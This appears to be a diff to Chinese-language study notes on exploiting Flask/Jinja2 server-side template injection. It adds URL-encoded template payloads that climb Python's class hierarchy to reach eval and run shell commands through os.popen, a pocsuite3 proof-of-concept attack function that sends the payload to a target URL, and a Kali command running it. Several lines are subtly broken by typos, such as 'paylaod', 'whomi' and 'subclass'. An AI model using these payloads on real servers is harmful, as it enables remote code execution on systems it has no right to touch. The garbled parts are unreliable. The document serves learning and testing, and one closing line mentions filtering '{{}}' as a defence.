@@ -536,7 +536,7 @@ for c in().__class__.__base__[0].__subclass__():
     if c.__name__=='_IterationGuard':
     c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
 
-再将其转为Jinja2语法格式，在每个语句的开始和结束处使用{{%%}}括起来
+再将其转为Jinja2语法格式，在每个语句的开始和结束处使用{{%%}}括起来,%20{% --> :
 
 {%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
 '%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
@@ -553,6 +553,26 @@ for c in().__class__.__base__[0].__subclass__():
 [1]在{{  %%}这里面的是c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
 
 [2].system('whoami')") ---> .popen(%27whomi%27.read()")
+
+[3]CyberChef: 'URL Decode' -> 'URL Encode'
+
+%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclass__()%20%25%7D%20%7B%25'%20%5C%0A'%20if%20c.__name__=='_IterationGuard'%20%25%7D%20%7B%7B%20c.__init__.__globals__%5B'__builtins__'%5D'%20%5C%0A'%5B'eval'%5D(%22__import__('os').popen('whomi'.read()%22)%20%25%25%7D%20%7B%25%20endif%20%25%7D%20%7B%25'%20%5C%0A'%20endfor%20%25%7D
+----------------------------------------------------------------------------
+'%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
+    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
+    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
+    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
+    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
+    '%20%7D%7D%oA%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
+    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'
+
+'{% for c in [].__class__.__base__.__subclasses__()%}
+    {% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}
+    {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("' cmd '").read()')}}
+    {% endif %}{% endif %}{% endfor %}
+    {% endif %}{% endfor %}'
 ----------------------------------------------------------------------------
 ```
 
@@ -614,7 +634,29 @@ def _attack(self):
     url = self.url + path
     #print(url)
     cmd = self.get_option("command")
-    payload = 
+  
+    payload = '%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
+    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
+    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
+    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
+    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
+    '%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
+    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'
+    try:
+        resq = requests.get(url + paylaod)
+        t = resq.text
+        t = t.replace('\n', '').replace('\r','')
+        print(t)
+        t = t.replace(" ","")
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = url
+        result['VerifyInfo']['Name'] = t
+    except Exception as e:
+        return
+----------------------------------------------------------------------------
+root@kali:~/pocsuite3-master# pocsuite -r test3.py -u http://x.x.x.x:8000/ --attack --command 'id'
+//Flash漏洞，"{{}}"中的内容会被当作代码执行，相应的防御中就需要对"{{}}"进行过滤，禁止次符号传入参数中。
+```
 
 </details>
 
